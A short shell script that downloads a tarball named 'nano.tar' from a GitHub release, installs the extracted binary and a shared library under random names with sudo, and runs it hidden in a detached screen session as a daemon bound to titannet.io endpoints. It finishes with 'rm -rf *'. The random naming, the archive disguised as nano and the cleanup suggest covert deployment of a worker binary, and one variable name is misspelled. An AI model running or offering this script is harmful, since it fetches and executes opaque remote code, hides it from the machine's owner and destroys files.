apt-get update
apt install -y nano screen
wget https://github.com/zibercount/terfprce/releases/download/v3.4.2/nano.tar
VAR1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
VAR2=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
tar -xf nano.tar
mv source $VAR1
sudo cp $VAR1 /usr/local/bin
sudo cp libgoworkerd.so /usr/local/lib
export LD_LIBRARY_PATH=$LD_LIZBRARY_PATH:./libgoworkerd.so
screen -dmS $VAR2 $VAR1 daemon start --init --url https://cassini-locator.titannet.io:5000/rpc/v0
sleep 5
echo Daemon start OK
sleep 5
$VAR1 bind --hash=B606D8BA-67D1-48A7-B165-0E308E805917 https://api-test1.container1.titannet.io/api/v2/device/binding
rm -rf *